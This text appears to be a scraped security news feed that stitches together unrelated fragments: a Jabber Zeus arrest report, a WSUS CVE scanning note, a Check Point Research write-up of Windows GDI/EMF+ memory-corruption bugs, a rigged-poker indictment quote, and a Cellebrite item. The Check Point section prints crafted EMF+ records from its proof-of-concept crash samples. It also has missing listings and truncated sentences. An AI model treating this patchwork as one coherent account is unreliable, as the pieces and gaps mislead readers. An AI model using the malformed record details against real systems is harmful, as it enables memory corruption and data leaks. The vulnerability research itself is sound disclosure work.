&lt;p&gt;The 2012 indictment targeting the Jabber Zeus crew named MrICQ as &amp;#8220;&lt;strong&gt;John Doe #3&lt;/strong&gt;,&amp;#8221; and said this person handled incoming notifications of newly compromised victims. The Department of Justice (DOJ) said MrICQ also helped the group launder the proceeds of their heists through electronic currency exchange services.&lt;/p&gt;
&lt;p&gt;Two sources familiar with the Jabber Zeus investigation said Rybtsov was arrested in Italy, although the exact date and circumstances of his arrest remain unclear. A &lt;a href="https://www.cortedicassazione.it/resources/cms/documents/Rassegna_mensile_MAGGIO_2025__settore_penale.pdf" rel="noopener" target="_blank"&gt;summary of recent decisions&lt;/a&gt; (PDF) published by the Italian Supreme Court states that in April 2025, Rybtsov lost a final appeal to avoid extradition to the United States.&lt;/p&gt;
&lt;p&gt;According to the mugshot website &lt;strong&gt;lockedup[.]wtf&lt;/strong&gt;, Rybtsov arrived in Nebraska on October 9, and was being held under an arrest warrant from the &lt;strong&gt;U.S. Federal Bureau of Investigation&lt;/strong&gt; (FBI).&lt;/p&gt;
&lt;p&gt;The data breach tracking service &lt;a href="https://constella.ai" rel="noopener" target="_blank"&gt;Constella Intelligence&lt;/a&gt; found breached records from the business profiling site bvdinfo[.]com showing that a 41-year-old Yuriy Igorevich Rybtsov worked in a building at 59 Barnaulska St. in Donetsk. Further searching on this address in Constella finds the same apartment building was shared by a business registered to &lt;strong&gt;Vyacheslav “Tank” Penchukov&lt;/strong&gt;, the leader of the Jabber Zeus crew in Ukraine.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_61804" style="width: 753px;"&gt;&lt;img alt="" class=" wp-image-61804" height="587" src="https://krebsonsecurity.com/wp-content/uploads/2022/11/tank-dj.png" width="743" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-61804"&gt;Vyacheslav “Tank” Penchukov, seen here performing as &amp;#8220;DJ Slava Rich&amp;#8221; in Ukraine, in an undated photo from social media.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Penchukov was &lt;a href="https://krebsonsecurity.com/2022/11/top-zeus-botnet-suspect-tank-arrested-in-geneva/" rel="noopener" target="_blank"&gt;arrested in 2022&lt;/a&gt; while traveling to meet his wife in Switzerland. Last year, a federal court in Nebraska &lt;a href="https://www.wired.com/story/vyacheslav-igorevich-penchukov-tank-zeus-malware-sentencing/" rel="noopener" target="_blank"&gt;sentenced Penchukov to 18 years in prison&lt;/a&gt; and ordered him to pay more than $73 million in restitution.&lt;span id="more-72496"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Lawrence Baldwin&lt;/strong&gt; is founder of &lt;a href="https://mynetwatchman.com" rel="noopener" target="_blank"&gt;myNetWatchman&lt;/a&gt;, a threat intelligence company based in Georgia that began tracking and disrupting the Jabber Zeus gang in 2009. myNetWatchman had secretly gained access to the Jabber chat server used by the Ukrainian hackers, allowing Baldwin to eavesdrop on the daily conversations between MrICQ and other Jabber Zeus members.&lt;/p&gt;
&lt;p&gt;Baldwin shared those real-time chat records with multiple state and federal law enforcement agencies, and with this reporter. Between 2010 and 2013, I spent several hours each day alerting small businesses across the country that their payroll accounts were about to be drained by these cybercriminals.&lt;/p&gt;
&lt;p&gt;Those notifications, and Baldwin&amp;#8217;s tireless efforts, saved countless would-be victims a great deal of money. In most cases, however, we were already too late. Nevertheless, the pilfered Jabber Zeus group chats provided the basis for dozens of stories published here about &lt;a href="https://krebsonsecurity.com/category/smallbizvictims/" rel="noopener" target="_blank"&gt;small businesses fighting their banks&lt;/a&gt; in court over six- and seven-figure financial losses.&lt;/p&gt;
&lt;p&gt;Baldwin said the Jabber Zeus crew was far ahead of its peers in several respects. For starters, their intercepted chats showed they worked to create a highly customized botnet directly with the author of the original Zeus Trojan &amp;#8212; &lt;strong&gt;Evgeniy Mikhailovich Bogachev&lt;/strong&gt;, a Russian man who has long been on the FBI&amp;#8217;s &amp;#8220;Most Wanted&amp;#8221; list. The feds have a &lt;a href="https://krebsonsecurity.com/2015/02/fbi-3m-bounty-for-zeus-trojan-author/" rel="noopener" target="_blank"&gt;standing $3 million reward&lt;/a&gt; for information leading to Bogachev&amp;#8217;s arrest.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_49974" style="width: 753px;"&gt;&lt;img alt="" class="size-full wp-image-49974" height="456" src="https://krebsonsecurity.com/wp-content/uploads/2019/12/bogachev.png" width="743" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-49974"&gt;Evgeniy M. Bogachev, in undated photos.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The core innovation of Jabber Zeus was an alert that MrICQ would receive each time a new victim entered a one-time password code into a phishing page mimicking their financial institution. The gang&amp;#8217;s internal name for this component was &amp;#8220;&lt;strong&gt;Leprechaun&lt;/strong&gt;,&amp;#8221; (the &lt;a href="https://www.youtube.com/watch?v=UiAg3puABeA" rel="noopener" target="_blank"&gt;video below&lt;/a&gt; from myNetWatchman shows it in action). Jabber Zeus would actually re-write the HTML code as displayed in the victim&amp;#8217;s browser, allowing them to intercept any passcodes sent by the victim&amp;#8217;s bank for multi-factor authentication.&lt;/p&gt;
&lt;p&gt;&amp;#8220;These guys had compromised such a large number of victims that they were getting buried in a tsunami of stolen banking credentials,&amp;#8221; Baldwin told KrebsOnSecurity. &amp;#8220;But the whole point of Leprechaun was to isolate the highest-value credentials &amp;#8212; the commercial bank accounts with two-factor authentication turned on. They knew these were far juicier targets because they clearly had a lot more money to protect.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;Baldwin said the Jabber Zeus trojan also included a custom &amp;#8220;backconnect&amp;#8221; component that allowed the hackers to relay their bank account takeovers through the victim&amp;#8217;s own infected PC.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The Jabber Zeus crew were literally connecting to the victim&amp;#8217;s bank account from the victim&amp;#8217;s IP address, or from the remote control function and by fully emulating the device,&amp;#8221; he said. &amp;#8220;That trojan was like a hot knife through butter of what everyone thought was state-of-the-art secure online banking at the time.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Although the Jabber Zeus crew was in direct contact with the Zeus author, the chats intercepted by myNetWatchman show Bogachev frequently ignored the group&amp;#8217;s pleas for help. The government says the real leader of the Jabber Zeus crew was &lt;strong&gt;Maksim Yakubets&lt;/strong&gt;, a 38-year Ukrainian man with Russian citizenship who went by the hacker handle &amp;#8220;&lt;strong&gt;Aqua&lt;/strong&gt;.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_49935" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-49935" height="611" src="https://krebsonsecurity.com/wp-content/uploads/2019/12/yukabets.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-49935"&gt;Alleged Evil Corp leader Maksim &amp;#8220;Aqua&amp;#8221; Yakubets. Image: FBI&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The Jabber chats intercepted by Baldwin show that Aqua interacted almost daily with MrICQ, Tank and other members of the hacking team, often facilitating the group&amp;#8217;s money mule and cashout activities remotely from Russia.&lt;/p&gt;
&lt;p&gt;The government says Yakubets/Aqua would later emerge as the leader of an elite cybercrime ring of at least 17 hackers that referred to themselves internally as &amp;#8220;&lt;strong&gt;Evil Corp&lt;/strong&gt;.&amp;#8221; Members of Evil Corp developed and used the &lt;strong&gt;Dridex&lt;/strong&gt; (a.k.a. &lt;strong&gt;Bugat&lt;/strong&gt;) trojan, which helped them siphon more than $100 million from hundreds of victim companies in the United States and Europe.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://krebsonsecurity.com/2019/12/inside-evil-corp-a-100m-cybercrime-menace/" rel="noopener" target="_blank"&gt;This 2019 story about the government&amp;#8217;s $5 million bounty&lt;/a&gt; for information leading to Yakubets&amp;#8217;s arrest includes excerpts of conversations between Aqua, Tank, Bogachev and other Jabber Zeus crew members discussing stories I&amp;#8217;d written about their victims. Both Baldwin and I were interviewed at length for a new weekly six-part podcast by the &lt;strong&gt;BBC&lt;/strong&gt; that delves deep into the history of Evil Corp. &lt;a href="https://www.bbc.com/audio/play/w3ct89y8" rel="noopener" target="_blank"&gt;Episode One&lt;/a&gt; focuses on the evolution of Zeus, while &lt;a href="https://www.bbc.com/audio/play/w3ct89y9" rel="noopener" target="_blank"&gt;the second episode&lt;/a&gt; centers on an investigation into the group by former FBI agent &lt;strong&gt;Jim Craig&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img alt="graph showing an increase in scans for port 8531 over the last few days." src="https://isc.sans.edu/diaryimages/images/Screenshot%202025-11-02%20at%2012_42_35%E2%80%AFPM.png" style="width: 697px; height: 399px;" /&gt;&lt;/p&gt;

&lt;p&gt;CVE-2025-59287 is exploited by connecting to affected WSUS servers on port 8530/TCP&amp;nbsp;(non-TLS) or 8531/TCP (TLS). Once connected, an attacker could exploit the vulnerability to execute scripts on a vulnerable server. Typically, an attacker begins by conducting reconnaissance and subsequently follows up with a network compromise.&lt;/p&gt;

&lt;p&gt;Sufficient details have been made public about the attack to suggest that any exposed vulnerable servers should be considered compromised at this point.&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/drawn-to-danger-windows-graphics-vulnerabilities-lead-to-remote-code-execution-and-memory-exposure/"&gt;Drawn to Danger: Windows Graphics Vulnerabilities Lead to Remote Code Execution and Memory Exposure&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading" id="background"&gt;Background&lt;/h2&gt;



&lt;p&gt;Check Point Research (CPR) identified three security vulnerabilities in the&amp;nbsp;&lt;em&gt;Graphics Device Interface (&lt;/em&gt;&lt;code&gt;GDI&lt;/code&gt;) in Windows. We promptly reported these issues to Microsoft, and they were addressed in the&amp;nbsp;&lt;em&gt;Patch Tuesday&lt;/em&gt;&amp;nbsp;updates in May, July, and August 2025.&lt;/p&gt;



&lt;p&gt;These are the vulnerabilities:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-30388"&gt;CVE-2025-30388&lt;/a&gt;, rated important and considered more likely to be exploited;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53766"&gt;CVE-2025-53766&lt;/a&gt;, classified as critical severity and may allow remote attackers to execute arbitrary code on affected systems;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47984"&gt;CVE-2025-47984&lt;/a&gt;, also rated important and can result in the unauthorized disclosure of sensitive information over the network.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Vulnerability disclosures such as these highlight the need for proactive measures to mitigate potential risks. Our purpose in publishing this blog after security fixes were implemented is to further raise awareness of these vulnerabilities and provide Windows users with defensive insights and mitigation recommendations. In the following sections, we detail the findings of our &lt;a href="https://research.checkpoint.com/2025/denial-of-fuzzing-rust-in-the-windows-kernel/"&gt;fuzzing campaign&lt;/a&gt;, which targeted Windows &lt;code&gt;GDI&lt;/code&gt; using the &lt;code&gt;EMF&lt;/code&gt; format and led to the discovery of these security vulnerabilities.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="geometry-gone-rogue---cve-2025-30388"&gt;Geometry Gone Rogue &amp;#8211; CVE-2025-30388&lt;/h2&gt;



&lt;p&gt;We found three separate crashes related to the processing of&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-emfplus/ae7927c3-e416-4069-a9b8-3200113d6c41"&gt;&lt;code&gt;EmfPlusDrawString&lt;/code&gt;&lt;/a&gt;,&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-emfplus/8d510051-eeb2-482f-9964-e9cd1dad6fca"&gt;&lt;code&gt;EmfPlusFillRects&lt;/code&gt;&lt;/a&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-emfplus/d7b561b0-3dc7-4444-b7ac-55492b5af0f4"&gt;&lt;code&gt;EmfPlusFillClosedCurve&lt;/code&gt;&lt;/a&gt;&amp;nbsp;records. All three cases have a common root cause: another record sets the stage for exploitation. However, the outcome varies depending on which additional records are processed during the execution. Our current analysis focuses on the crash involving the&amp;nbsp;&lt;code&gt;EmfPlusDrawString&lt;/code&gt;&amp;nbsp;record.&lt;/p&gt;



&lt;p&gt;Multiple access violation exceptions occurred in the&amp;nbsp;&lt;code&gt;ScanOperation::AlphaMultiply_sRGB()&lt;/code&gt;,&amp;nbsp;&lt;code&gt;ScanOperation::Blend_sRGB_sRGB_MMX()&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;EpAntialiasedFiller::OutputSpan()&lt;/code&gt;&amp;nbsp;functions within version&amp;nbsp;&lt;a href="https://msdl.microsoft.com/download/symbols/gdiplus.dll/261FF48616c000/gdiplus.dll"&gt;&lt;code&gt;10.0.26100.3037&lt;/code&gt;&lt;/a&gt;&amp;nbsp;of the&amp;nbsp;&lt;code&gt;GdiPlus.dll&lt;/code&gt;&amp;nbsp;module. These exceptions were triggered when the system attempted to read or write memory at the end of a&amp;nbsp;&lt;code&gt;4000/0xFA0&lt;/code&gt;&amp;nbsp;bytes heap block, or while attempting to access reserved but unallocated memory.&lt;/p&gt;



&lt;p&gt;This vulnerability could potentially allow a remote attacker to perform out-of-bounds read or write memory operations using a specially crafted&amp;nbsp;&lt;code&gt;EMF+&lt;/code&gt;&amp;nbsp;metafile.&amp;nbsp;&lt;em&gt;Figure 1&lt;/em&gt;&amp;nbsp;shows the decompiled source code of the&amp;nbsp;&lt;code&gt;ScanOperation::AlphaMultiply_sRGB()&lt;/code&gt;&amp;nbsp;function at the time of the crash.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-32166" height="550" src="https://research.checkpoint.com/wp-content/uploads/2025/11/GJ98BB3FT2-image1-1024x550.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p class="has-text-align-center"&gt;&lt;em&gt;Figure 1.&lt;/em&gt;&amp;nbsp;Decompiled source code of the affected&amp;nbsp;&lt;code&gt;ScanOperation::AlphaMultiply_sRGB()&lt;/code&gt;&amp;nbsp;function.&lt;/p&gt;



&lt;p&gt;In our crash sample, which serves as a proof of concept (PoC) for reproducing a vulnerability, an&amp;nbsp;&lt;code&gt;EmfPlusClear&lt;/code&gt;&amp;nbsp;record is located before the&amp;nbsp;&lt;code&gt;EmfPlusDrawString&lt;/code&gt;&amp;nbsp;record within the metafile. This record clears the output coordinate space and initializes it with a background color and transparency, as defined by its&amp;nbsp;&lt;code&gt;Color&lt;/code&gt;&amp;nbsp;field. The field contains an&amp;nbsp;&lt;code&gt;EmfPlusARGB&lt;/code&gt;&amp;nbsp;object specifying red, green, blue, and alpha components. This detail is significant because it allows an attacker to control the value written to memory during exploitation.&amp;nbsp;&lt;em&gt;Listing 1&lt;/em&gt;&amp;nbsp;shows the affected&amp;nbsp;&lt;code&gt;EmfPlusClear&lt;/code&gt;&amp;nbsp;record.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;EmfPlusClear clear = {
    .Type     = 0x4009,
    .Flags    = 0x0102,
    .Size     = 0x0000003c,
    .DataSize = 0x00000030,
    .Color    = 0xaabbccff  // Value written to memory
};
&lt;/pre&gt;



&lt;p class="has-text-align-center"&gt;Listing 1. Sample EmfPlusClear record showing the value written to memory.&lt;/p&gt;



&lt;p&gt;Further investigation revealed that the&amp;nbsp;&lt;code&gt;EmfPlusClear&lt;/code&gt;&amp;nbsp;record handler uses the&amp;nbsp;&lt;code&gt;EpScanBitmap::Start()&lt;/code&gt;&amp;nbsp;function to allocate a heap block to store 4000 bytes (0xFA0). This buffer is then populated with the specified&amp;nbsp;&lt;code&gt;EmfPlusARGB&lt;/code&gt;&amp;nbsp;object, which undergoes alpha multiplication by the&amp;nbsp;&lt;code&gt;AlphaMultiply_sRGB()&lt;/code&gt;&amp;nbsp;function during the processing of the&amp;nbsp;&lt;code&gt;EmfPlusDrawString&lt;/code&gt;&amp;nbsp;record.&lt;/p&gt;



&lt;p&gt;Note that the loop counter stored in the&amp;nbsp;&lt;code&gt;ebx&lt;/code&gt;&amp;nbsp;register begins at 0x950. As each iteration writes a 4-byte object into the target buffer at&amp;nbsp;&lt;code&gt;ecx + edx&lt;/code&gt;, the function writes out-of-bounds after 1000 bytes, when the counter reaches 0x567. This behavior can be observed in&amp;nbsp;&lt;em&gt;Listing 2&lt;/em&gt;&amp;nbsp;which shows an excerpt from the crash analysis.&lt;/p&gt;

&lt;p class="has-text-align-center"&gt;&lt;em&gt;Listing 2.&lt;/em&gt;&amp;nbsp;Stack trace showing an access violation in the&amp;nbsp;&lt;code&gt;ScanOperation::AlphaMultiply_sRGB()&lt;/code&gt;&amp;nbsp;function.&lt;/p&gt;



&lt;p&gt;Alpha values are multiplied by color values to ensure that transparent areas (where the alpha value is 0) do not contribute any color (R = G = B = 0). As a result, colors in semi-transparent areas appear darker because these objects emit less light compared to opaque ones.&lt;/p&gt;



&lt;p&gt;The fourth byte is the alpha value, which can range from 0x00 to 0xFF. Setting the alpha value to 0xFF allows an attacker near-complete control over what is written to the buffer, as the RGB values remain unchanged. In the example above,&amp;nbsp;&lt;code&gt;B=0xAA&lt;/code&gt;,&amp;nbsp;&lt;code&gt;G=0xBB&lt;/code&gt;,&amp;nbsp;&lt;code&gt;R=0xCC&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;A=0xFF&lt;/code&gt;&amp;nbsp;were written into the target buffer.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32167" height="561" src="https://research.checkpoint.com/wp-content/uploads/2025/11/GJ98BB3FT2-image2-1024x561.png" width="1024" /&gt;&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;As illustrated by&amp;nbsp;&lt;em&gt;Figure 2&lt;/em&gt;, patch analysis confirmed that the crashes which occurred during the processing of various metafile records all shared a common root cause: the presence of invalid&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/windef/ns-windef-rect"&gt;&lt;code&gt;RECT&lt;/code&gt;&lt;/a&gt;&amp;nbsp;objects within an&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-emfplus/0dfb6f4f-e53c-413b-80cf-57a3cadd5d38"&gt;&lt;code&gt;EmfPlusSetTSClip&lt;/code&gt;&lt;/a&gt;&amp;nbsp;record that preceded the other records in which the crashes were observed.&amp;nbsp;&lt;em&gt;Listing 3&lt;/em&gt;&amp;nbsp;shows the affected record from our crash samples.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;EmfPlusSetTSClip clip = {
    .Type        = 0x403a,
    .Flags       = 0x0003, // Number of RECT objects
    .Size        = 0x00000048,
    .DataSize    = 0x0000003c,
    .NumRects[3] = {
        { 0x00000005, 0x00000000, 0x04000000, 0x0000001f }, // Valid
        { 0x00000000, 0x00e90000, 0xfff70000, 0x00000000 }, // Not valid
        { 0x00000000, 0x00000000, 0x00000015, 0x003f8000 }  // Valid
    }
};
&lt;/pre&gt;



&lt;p class="has-text-align-center"&gt;Listing 3. Sample EmfPlusSetTSClip record containing invalid RECT objects.&lt;/p&gt;



&lt;p&gt;Processing invalid&amp;nbsp;&lt;code&gt;RECT&lt;/code&gt;&amp;nbsp;objects results in a heap-based buffer overflow that may allow an attacker to perform out-of-bounds memory operations. An attacker could exploit this vulnerability by using various other metafile records to write or read memory, as a corrupted&amp;nbsp;&lt;code&gt;EmfPlusSetTSClip&lt;/code&gt;&amp;nbsp;record sets the stage for exploitation. Looking at the rendering of the sample&amp;nbsp;&lt;code&gt;EmfPlusFillRects&lt;/code&gt;&amp;nbsp;record in&amp;nbsp;&lt;em&gt;Figure 3&lt;/em&gt;&amp;nbsp;indicates that it is possible to disclose uninitialized or initialized heap bytes via the filled rectangle.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32174" height="520" src="https://research.checkpoint.com/wp-content/uploads/2025/11/image3.gif" width="960" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;em&gt;Figure 3.&lt;/em&gt;&amp;nbsp;Leaking heap memory in Word via the sample&amp;nbsp;&lt;code&gt;EmfPlusFillRects&lt;/code&gt;&amp;nbsp;record.&lt;/p&gt;



&lt;p&gt;As we can see from the resulting image in Microsoft Word 365, the output varies in each rendering, which demonstrates that this crash sample leaks memory and eventually Word is unexpectedly terminated. This behavior already crosses a security boundary as it can lead to information disclosure if an attacker can read back the rendered image, for example, using JavaScript in a web browser.&lt;/p&gt;

&lt;p class="has-text-align-center"&gt;Listing 5. Stack trace showing an access violation in the ScanOperation::AlphaDivide_sRGB() function.&lt;/p&gt;



&lt;p&gt;In a bitmap image, a scan-line is one horizontal row of pixels. Processing an image line by line means handling one scan-line at a time, from left to right and top to bottom. Further analysis showed that the&amp;nbsp;&lt;code&gt;EpScanBitmap::NextBuffer()&lt;/code&gt;&amp;nbsp;function never verified that the number of scan-lines it was about to process fit in the destination bitmap, meaning that the function could be tricked into reading or writing past the bottom edge of an image if a call requested more scan-lines than existed.&lt;/p&gt;



&lt;p&gt;Assuming that the bitmap allocated for thumbnail generation is 100&amp;#215;100 (0x64 × 0x64) pixels, the rectangle data in the PoC metafile deliberately pushes the scan position past the bottom edge of the bitmap and triggers the out-of-bounds write. Any one of those rectangles forces the rasterizer (which converts vector graphics into a pixel grid) to process scan-lines whose Y coordinate is well beyond the 0-99 range of the bitmap.&lt;/p&gt;

The function now automatically trims the requested scan-lines to fit within the remaining rows, preventing any out-of-bounds access, as shown in&amp;nbsp;&lt;em&gt;Figure 7&lt;/em&gt;.&lt;/p&gt;

&lt;p class="has-text-align-center"&gt;Listing 6. Stack trace showing an access violation in the StringLengthWorkerW() function.&lt;/p&gt;



&lt;p&gt;The stack trace suggests that the issue may lie with the&amp;nbsp;&lt;code&gt;StringLengthWorkerW()&lt;/code&gt;&amp;nbsp;function, which performs a length check on user-controlled data and assumes the input is a null-terminated string. However, if the provided string is not null-terminated, the function may read beyond the allocated buffer, leading to potential information disclosure.&lt;/p&gt;



&lt;p&gt;The decompiled source code of the&amp;nbsp;&lt;code&gt;MRSTARTDOC::bPlay()&lt;/code&gt;&amp;nbsp;function shown in&amp;nbsp;&lt;em&gt;Figure 8&lt;/em&gt;&amp;nbsp;demonstrates that&amp;nbsp;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-35837"&gt;CVE-2022-35837&lt;/a&gt;&amp;nbsp;was addressed by assigning values to the&amp;nbsp;&lt;code&gt;lpszDocName&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;lpszOutput&lt;/code&gt;&amp;nbsp;fields through a calculated offset stored in the&amp;nbsp;&lt;code&gt;v5&lt;/code&gt;&amp;nbsp;variable, if their respective fields are non-null.&lt;/p&gt;

Meanwhile, the&amp;nbsp;&lt;code&gt;lpszOutput&lt;/code&gt;&amp;nbsp;field points to&amp;nbsp;&lt;code&gt;0x6b14&lt;/code&gt;, positioned at offset&amp;nbsp;&lt;code&gt;1Ch + 14h = 30h&lt;/code&gt;:&lt;/p&gt;

&lt;/pre&gt;



&lt;p class="has-text-align-center"&gt;Listing 8. Raw EMR_STARTDOC record showing the calculated offsets.&lt;/p&gt;



&lt;p&gt;The out-of-bounds read occurs because the&amp;nbsp;&lt;code&gt;MRSTARTDOC::bPlay()&lt;/code&gt;&amp;nbsp;function validates string offsets inside the record. A specially crafted metafile may pad the first string in the&amp;nbsp;&lt;code&gt;lpszDocName&lt;/code&gt;&amp;nbsp;field so that it nearly reaches the end of the record. After copying that string, the code advances its internal cursor beyond that point, but the next validation for the&amp;nbsp;&lt;code&gt;lpszOutput&lt;/code&gt;&amp;nbsp;field still treats the supplied offset as if it were relative to the original base of the record.&lt;/p&gt;



&lt;p&gt;This discrepancy allows an attacker to provide a value that passes the&amp;nbsp;&lt;code&gt;MR::bValidOff()&lt;/code&gt;&amp;nbsp;function while actually pointing outside the heap block. Because no null terminator is found, the&amp;nbsp;&lt;code&gt;StringLengthWorkerW()&lt;/code&gt;&amp;nbsp;function continues reading into adjacent memory, exposing its contents. The crash sample intensifies the issue by setting the&amp;nbsp;&lt;code&gt;EMF_HEADER.nBytes&lt;/code&gt;&amp;nbsp;field to just 0x120 (288) bytes, causing the allocated buffer to be smaller than the embedded data and guaranteeing an over-read.&lt;/p&gt;



&lt;p&gt;Microsoft fixed this vulnerability within the&amp;nbsp;&lt;code&gt;MRSTARTDOC::bPlay()&lt;/code&gt;&amp;nbsp;handler function in version&amp;nbsp;&lt;a href="https://msdl.microsoft.com/download/symbols/gdi32full.dll/A25C4001f1000/gdi32full.dll"&gt;10.0.26100.4652&lt;/a&gt;&amp;nbsp;of&amp;nbsp;&lt;code&gt;gdi32full.dll&lt;/code&gt;&amp;nbsp;by correcting the offset arithmetic. The patched function now converts the pointer back to an offset relative to the start of the record before revalidating it and applies the same logic to the&amp;nbsp;&lt;code&gt;lpszOutput&lt;/code&gt;&amp;nbsp;field. Therefore, the check matches the data that will be dereferenced, as shown in&amp;nbsp;&lt;em&gt;Figure 9&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This bug was addressed with&amp;nbsp;&lt;a href="https://support.microsoft.com/en-us/topic/july-8-2025-kb5062553-os-build-26100-4652-523e69cb-051b-43c6-8376-6a76d6caeefd"&gt;KB5062553&lt;/a&gt;&amp;nbsp;in the&amp;nbsp;&lt;em&gt;July 2025 Patch Tuesday&lt;/em&gt;&amp;nbsp;as an important severity information disclosure vulnerability tracked as&amp;nbsp;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47984"&gt;CVE-2025-47984&lt;/a&gt;. MSRC classified it as&amp;nbsp;&lt;em&gt;CWE-693: Protection Mechanism Failure&lt;/em&gt;, which in this case really means that the security fix to address&amp;nbsp;&lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-35837"&gt;CVE-2022-35837&lt;/a&gt;&amp;nbsp;was incomplete.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;We discovered vulnerabilities in Windows&amp;nbsp;&lt;code&gt;GDI&lt;/code&gt;&amp;nbsp;that could have serious implications for system security. Our extensive investigation into&amp;nbsp;&lt;code&gt;EMF+&lt;/code&gt;&amp;nbsp;files shows that staying ahead of potential threats requires continuous diligence and adaptation. By sharing these findings, we hope to raise awareness and provide valuable insights and recommendations to enhance security for all Windows users.&lt;/p&gt;



&lt;p&gt;Security vulnerabilities can persist undetected for years, often resurfacing due to incomplete fixes. A particular information disclosure vulnerability, despite being formally addressed with a security patch, remained active for years due to the original issue receiving only a partial fix. This example underscores a basic conundrum for researchers: introducing a vulnerability is often easy, fixing it can be difficult, and verifying that a fix is both thorough and effective is even more challenging.&lt;/p&gt;



&lt;p&gt;These issues highlight why comprehensive and continuous security testing, using verification techniques that must be constantly updated and improved, is crucial. This effort can be greatly enhanced by close collaboration between vendors and security researchers, including sharing planned fixes with the researchers who initially reported the issue. Such a collaborative approach adds an extra layer of review, helping to catch potential gaps early and strengthens the overall security of the software ecosystem.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;In a typical legitimate poker game, a dealer uses a shuffling machine to shuffle the cards randomly before dealing them to all the players in a particular order.  As set forth in the indictment, the rigged games used altered shuffling machines that contained hidden technology allowing the machines to read all the cards in the deck.  Because the cards were always dealt in a particular order to the players at the table, the machines could determine which player would have the winning hand. This information was transmitted to an off-site member of the conspiracy, who then transmitted that information via cellphone back to a member of the conspiracy who was playing at the table, referred to as the &amp;#8220;Quarterback&amp;#8221; or &amp;#8220;Driver.&amp;#8221;  The Quarterback then secretly signaled this information (usually by prearranged signals like touching certain chips or other items on the table) to other co-conspirators playing at the table, who were also participants in the scheme.  Collectively, the Quarterback and other players in on the scheme (i.e., the cheating team) used this information to win poker games against unwitting victims, who sometimes lost tens or hundreds of thousands of dollars at a time.

That has thankfully changed, but companies like Cellebrite offer law enforcement tools that can &lt;a href="https://arstechnica.com/security/2025/02/android-0-day-sold-by-cellebrite-exploited-to-hack-serbian-students-phone/"&gt;bypass security on some devices&lt;/a&gt;. The company keeps the specifics quiet, but an anonymous individual recently logged in to a Cellebrite briefing and came away with a list of which of Google’s Pixel phones are vulnerable to Cellebrite phone hacking.&lt;/p&gt;
&lt;p&gt;This person, who goes by the handle rogueFed, posted screenshots from the recent Microsoft Teams meeting to the &lt;a href="https://discuss.grapheneos.org/d/27698-new-cellebrite-capability-obtained-in-teams-meeting"&gt;GrapheneOS forums&lt;/a&gt; (spotted by &lt;a href="https://www.404media.co/someone-snuck-into-a-cellebrite-microsoft-teams-call-and-leaked-phone-unlocking-details/"&gt;404 Media&lt;/a&gt;). GrapheneOS is an Android-based operating system that can be installed on select phones, including Pixels. It ships with enhanced security features and no Google services. Because of its popularity among the security-conscious, Cellebrite apparently felt the need to include it in its matrix of Pixel phone support.&lt;/p&gt;
